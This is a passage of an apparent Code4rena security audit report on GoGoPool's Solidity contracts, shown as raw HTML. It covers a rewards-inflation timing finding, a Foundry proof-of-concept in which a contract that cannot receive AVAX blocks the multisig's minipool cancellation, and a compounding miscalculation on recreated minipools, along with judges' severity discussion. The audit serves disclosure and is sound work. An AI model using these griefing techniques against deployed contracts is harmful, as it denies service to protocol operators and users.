class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">InflationIntervalStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">298</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inflated</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">InflationIntervalStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">397</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inflated</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">InflationIntervalStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">496</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inflated</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">InflationIntervalStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">595</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inflated</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span></span></span></code></pre>\n<p>While at <code>timestamp = 595</code>, inflated times should be\n<code>(595 - 100) / 50 = 9</code> instead.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider only increasing <code>InflationIntervalStartTime</code> by the amount of intervals time interval length.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1379452071\">emersoncloud (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I agree with this issue, but assets can’t be stolen, lost or compromised directly. Medium severity is more appropriate (<a href=\"https://docs.code4rena.com/awarding/judging-criteria#estimating-risk\">https://docs.code4rena.com/awarding/judging-criteria#estimating-risk</a>)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1407742757\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I have considered a Higher Severity, due to logical flaws.</p>\n<p>However, I believe that the finding</p>\n<ul>\n<li>Relies on the Condition of being called less than intended</li>\n<li>Causes an incorrect amount of emissions (logically close to loss of Yield)</li>\n</ul>\n<p>For those reasons, I believe Medium Severity to be the most appropriate</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1421426366\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged, not fixing in this first version of the protocol.</p>\n<p>We can and will have rialto call startRewardsCycle if needed, and think it’s unlikely to become delayed.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-rialto-may-not-be-able-to-cancel-minipools-created-by-contracts-that-cannot-receive-avax\" style=\"position:relative;\"><a href=\"#m-07-rialto-may-not-be-able-to-cancel-minipools-created-by-contracts-that-cannot-receive-avax\" aria-label=\"m 07 rialto may not be able to cancel minipools created by contracts that cannot receive avax permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/623\">[M-07] Rialto may not be able to cancel minipools created by contracts that cannot receive AVAX</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/623\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/809\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/686\">peritoflores</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/146\">ladboy233</a></em></p>\n<p>A malicious node operator may create a minipool that cannot be cancelled.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Rialto may cancel a minipool by calling <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L520\">cancelMinipoolByMultisig</a>, however the function sends AVAX to the minipool owner, and the owner may block receiving of AVAX, causing the call to <code>cancelMinipoolByMultisig</code> to fail (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664\">MinipoolManager.sol#L664</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_cancelMinipoolAndReturnFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.owner&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The following PoC demonstrates how calls to <code>cancelMinipoolByMultisig</code> can be blocked:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testCancelMinipoolByMultisigDOS_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node operator is a contract than cannot receive AVAX:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// contract NodeOpContract {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">NodeOpContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOpContract</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NodeOpContract</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">dealGGP</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOpContract</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOpContract</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOpContract</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;INVALID_NODEID&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.status&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Prelaunch</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Rialto trices to cancel the minipool created by the node operator contract but the transaction reverts since</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// the node operator contract cannot receive AVAX.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// FAIL: reverted with ETH_TRANSFER_FAILED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cancelMinipoolByMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using the <a href=\"https://fravoll.github.io/solidity-patterns/pull_over_push.html\">Pull over Push pattern</a> to return AVAX to owners of minipools that are canceled by Rialto.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/623\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/623#issuecomment-1407735453\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how the checked return value from call can be used as a grief to prevent canceling of a minipool.</p>\n<p>The finding can have different severities based on the context, in this case, the cancelling can be denied, however, other state transitions are still possible.</p>\n<p>For this reason (functionality is denied), I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/623#issuecomment-1421428356\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged. </p>\n<p>We’ll make a note of this in our documentation, but not fixing immediately.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-recreated-pools-receive-a-wrong-avax-amount-due-to-miscalculated-compounded-liquid-staker-amount\" style=\"position:relative;\"><a href=\"#m-08-recreated-pools-receive-a-wrong-avax-amount-due-to-miscalculated-compounded-liquid-staker-amount\" aria-label=\"m 08 recreated pools receive a wrong avax amount due to miscalculated compounded liquid staker amount permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620\">[M-08] Recreated pools receive a wrong AVAX amount due to miscalculated compounded liquid staker amount</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/501\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/489\">Franfran</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/347\">0xbepresent</a></em></p>\n<p>After recreation, minipools will receive more AVAX than the sum of their owners’ current stake and the rewards that they generated.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Multipools that successfully finished validation may be recreated by multisigs, before staked GGP and deposited AVAX have been withdrawn by minipool owners (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L444\">MinipoolManager.sol#L444</a>). The function compounds deposited AVAX by adding the rewards earned during previous validation periods to the AVAX amounts deposited and requested from stakers (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L450-L452\">MinipoolManager.sol#L450-L452</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Compound the avax plus rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compoundedAvaxNodeOpAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxNodeOpAmt&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">compoundedAvaxNodeOpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">compoundedAvaxNodeOpAmt</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The function assumes that a node operator and liquid stakers earned an equal reward amount: <code>compoundedAvaxNodeOpAmt</code> is calculated as the sum of the current AVAX deposit of the minipool owner and the node operator reward earned so far. However, liquid stakers get a smaller reward than node operators: the minipool node commission fee is applied to their share (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L417\">MinipoolManager.sol#L417</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxHalfRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node operators recv an additional commission fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">avaxHalfRewards</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">avaxHalfRewards</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolNodeCommissionFeePct</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>As a result, the <code>avaxLiquidStakerAmt</code> set in the <code>recreateMinipool</code> function will always be bigger than the actual amount since it equals to the compounded node operator amount, which includes node operator rewards.</p>\n<p>Next, in the <code>recreateMinipool</code> function, the assigned AVAX amount is increased by the amount borrowed from liquid stakers + the node operator amount, which is again wrong because the assigned AVAX amount can only be increased by the liquid stakers’ reward share (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L457-L459\">MinipoolManager.sol#L457-L459</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseAVAXStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mp</span><span 